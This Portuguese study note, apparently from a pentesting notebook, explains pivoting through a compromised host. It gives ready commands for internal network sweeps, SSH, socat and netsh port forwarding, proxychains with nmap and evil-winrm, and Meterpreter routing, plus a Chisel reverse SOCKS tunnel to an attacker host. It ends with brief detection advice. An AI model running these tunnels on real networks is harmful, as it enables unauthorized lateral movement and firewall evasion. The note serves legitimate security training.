# Pivoting, Tunneling & Port Forwarding

Pivoting é a técnica de usar um host comprometido (pivot) para ter acesso e rotear tráfego para segmentos de rede internos inacessíveis diretamente.

---

## Conceitos Chave
- **Pivot Host / Foothold:** Máquina comprometida na rede de perímetro (Dual-Homed) com acesso a duas redes distintas.
- **Port Forwarding:** Redirecionamento de uma porta específica da máquina remota para a máquina local.
- **Dynamic Port Forwarding:** Criação de um servidor Proxy SOCKS (SOCKS4/SOCKS5) para rotear tráfego arbitrário de qualquer ferramenta.
- **Tunneling:** Encapsulamento de um protocolo de rede dentro de outro (ex: IP dentro de HTTP, SOCKS dentro de SSH).

---

## Descoberta de Rede no Pivot Host
Antes de estabelecer túneis, descubra hosts na rede interna:
- **Ping Sweep via Linux Bash:**
```bash
for i in {1..254}; do ping -c 1 -W 1 172.16.5.$i | grep "from"; done
```
- **NetExec (nxc) SMB Scan:**
```bash
nxc smb 172.16.5.0/24
```
- **arp-scan & fping:**
```bash
arp-scan -I eth1 --localnet
fping -a -g 172.16.5.0/24 2>/dev/null
```

---

## Ttécnicas de Redirecionamento com SSH

### 1. SSH Local Port Forwarding (`-L`)
Redireciona uma porta da máquina do atacante para uma porta no destino através do servidor SSH:
```bash
ssh -L 8080:172.16.5.15:80 user@<PIVOT_IP>
```
*(Acessar `http://localhost:8080` abre o servidor web da máquina interna `172.16.5.15`)*

### 2. SSH Dynamic Port Forwarding (`-D` com Proxychains)
Cria um proxy SOCKS local na porta 9050:
```bash
ssh -D 9050 -N -f user@<PIVOT_IP>
```
Configuração do `/etc/proxychains.conf`:
```ini
[ProxyList]
socks5 127.0.0.1 9050
```
Execução de ferramentas via proxy:
```bash
proxychains nmap -sT -Pn -p 21,22,80,445 172.16.5.15
proxychains evil-winrm -i 172.16.5.15 -u admin -p pass
```

### 3. SSH Remote Reverse Port Forwarding (`-R`)
Usado quando a máquina pivot precisa enviar conexões de volta para o atacante:
```bash
ssh -R 8000:localhost:80 user@<ATTACKER_IP>
```

---

## Tunelamento e Pivoting com [[Metasploit]]
- **Autoroute no Meterpreter:**
```text
meterpreter > run autoroute -s 172.16.5.0/24
```
- **Servidor Proxy SOCKS no Metasploit:**
```text
use auxiliary/server/socks_proxy
set SRVPORT 1080
set VERSION 5
run
```
- **Port Forwarding no Meterpreter:**
```text
meterpreter > portfwd add -l 3389 -p 3389 -r 172.16.5.15
```

---

## Redirecionamento com Socat
Utilitário versátil em Linux para redirecionar conexões de portas:
- **Reverse Port Forwarding:**
```bash
socat TCP-LISTEN:8080,fork TCP:172.16.5.15:80
```

---

## Outras Ferramentas e Protocolos de Tunelamento

### 1. [[Chisel]] (SOCKS5 sobre HTTP/WebSockets)
- **Servidor no Atacante:**
```bash
./chisel server -p 8000 --reverse
```
- **Cliente na Vítima (Pivot):**
```bash
chisel client <ATTACKER_IP>:8000 R:socks
```

### 2. RPIVOT & Plink
- **rpivot:** Túnel SOCKS reverso com suporte a proxies NTLM corporativos.
- **Plink.exe:** Linha de comando do PuTTY para Windows utilizada para criar túneis SSH reversos.

### 3. Windows Netsh
Redirecionamento nativo do Windows sem necessidade de instalar ferramentas externas:
```cmd
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.5.15
```

### 4. Tunelamento DNS & ICMP
- **DNS Tunneling (dnscat2):** Encapsula tráfego em consultas DNS TXT/CNAME para bypassar firewalls rígidos.
- **ICMP Tunneling (ptunnel-ng):** Transfere dados dentro do corpo de pacotes ICMP Echo Request/Reply.

### 5. RDP & SOCKS (SocksOverRDP)
Permite criar um canal SOCKS proxy dentro de uma sessão RDP ativa usando canais virtuais dinâmicos (Dynamic Virtual Channels).

---

## Detecção & Prevenção
- Segmentação estrita de rede (VLANs com Zero Trust).
- Monitoramento de conexões persistentes de longa duração (SIEM / EDR).
- Inspeção profunda de pacotes (DPI) para identificar protocolos encapsulados em HTTP ou DNS.

---
*Notas relacionadas:* [[Chisel]], [[Shells & Payloads]], [[Active Directory]], [[Password Attacks]]
